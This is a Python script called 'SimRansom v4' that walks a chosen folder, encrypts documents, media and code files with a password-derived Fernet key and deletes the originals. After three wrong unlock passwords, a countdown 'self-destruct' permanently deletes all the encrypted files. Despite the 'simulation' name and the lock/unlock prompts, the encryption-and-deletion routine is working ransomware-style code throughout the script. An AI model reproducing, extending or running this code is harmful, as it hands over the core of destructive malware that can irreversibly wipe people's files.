#!/usr/bin/env python3
import os
import base64
import hashlib
import time
from cryptography.fernet import Fernet
from getpass import getpass
from colorama import Fore, init
from datetime import datetime

init(autoreset=True)

# ✅ Config
MAX_ATTEMPTS = 3
LOG_FILE = "ransom_log.txt"
PASS_FILE = "ransom_password.txt"

# ✅ Supported file types
common_types = [".txt", ".pdf", ".mp3", ".mp4", ".py", ".json", ".jpg", ".png", ".apk", ".docx", ".xlsx", ".pptx"]

# ✅ Key Generator
def generate_key(password):
    key = hashlib.sha256(password.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(key))

# ✅ Logging
def log_event(message):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {message}\n")

# ✅ Encrypt
def encrypt_files(folder, fernet):
    for root, dirs, files in os.walk(folder):
        for file in files:
            ext = os.path.splitext(file)[-1].lower()
            if ext in common_types:
                full_path = os.path.join(root, file)
                try:
                    with open(full_path, "rb") as f:
                        data = f.read()
                    encrypted = fernet.encrypt(data)
                    with open(full_path + ".locked", "wb") as f:
                        f.write(encrypted)
                    os.remove(full_path)
                    print(f"{Fore.GREEN}🔐 Encrypted: {file}")
                    log_event(f"Encrypted: {full_path}")
                except Exception as e:
                    print(f"{Fore.RED}Error encrypting {file}: {e}")

# ✅ Decrypt
def decrypt_files(folder, fernet):
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file.endswith(".locked"):
                full_path = os.path.join(root, file)
                try:
                    with open(full_path, "rb") as f:
                        data = f.read()
                    decrypted = fernet.decrypt(data)
                    new_path = full_path.replace(".locked", "")
                    with open(new_path, "wb") as f:
                        f.write(decrypted)
                    os.remove(full_path)
                    print(f"{Fore.GREEN}✅ Decrypted: {new_path}")
                    log_event(f"Decrypted: {new_path}")
                except Exception as e:
                    print(f"{Fore.RED}❌ Failed to decrypt {file}: {e}")

# ✅ Self-destruct
def self_destruct(folder):
    print(f"\n{Fore.RED}☠️  Initiating self-destruct in 10 seconds...")
    for i in range(1, 11):
        print(f"{Fore.YELLOW}⏳ {i}....", end=" ", flush=True)
        time.sleep(1)
    print("\n")
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file.endswith(".locked"):
                try:
                    os.remove(os.path.join(root, file))
                    print(f"{Fore.RED}Deleted: {file}")
                    log_event(f"Deleted: {file}")
                except:
                    continue
    print(f"{Fore.RED}☠️  All encrypted files destroyed.")
    log_event("Self-destruct triggered and files deleted.")

# ✅ Save Password
def save_password(password):
    hashed = hashlib.sha256(password.encode()).hexdigest()
    with open(PASS_FILE, "w") as f:
        f.write(hashed)

# ✅ Check Password
def check_password(input_pw):
    if not os.path.exists(PASS_FILE):
        return False
    hashed_input = hashlib.sha256(input_pw.encode()).hexdigest()
    with open(PASS_FILE, "r") as f:
        stored = f.read().strip()
    return hashed_input == stored

# ✅ Main
def main():
    print(f"{Fore.CYAN}🔐 SimRansom v4 — Secure File Locker")
    mode = input(f"{Fore.YELLOW}🔄 Mode (lock/unlock): ").strip().lower()
    folder = input(f"{Fore.YELLOW}📁 Enter target folder path: ").strip()

    if not os.path.exists(folder):
        print(f"{Fore.RED}❌ Folder does not exist.")
        return

    if mode == "lock":
        password = getpass("🔑 Set a password: ")
        confirm = getpass("🔁 Confirm password: ")
        if password != confirm:
            print(f"{Fore.RED}❌ Passwords do not match.")
            return
        fernet = generate_key(password)
        save_password(password)
        encrypt_files(folder, fernet)
        print(f"{Fore.GREEN}✅ All files encrypted and locked.")

    elif mode == "unlock":
        attempts = 0
        while attempts < MAX_ATTEMPTS:
            password = getpass("🔑 Enter password: ")
            if check_password(password):
                fernet = generate_key(password)
                decrypt_files(folder, fernet)
                print(f"{Fore.GREEN}✅ All files decrypted successfully.")
                return
            else:
                attempts += 1
                print(f"{Fore.RED}[X] Wrong password! ({attempts}/{MAX_ATTEMPTS})")

        # ❌ Too many wrong attempts
        self_destruct(folder)

    else:
        print(f"{Fore.RED}❌ Invalid mode. Use 'lock' or 'unlock'.")

if __name__ == "__main__":
    main()
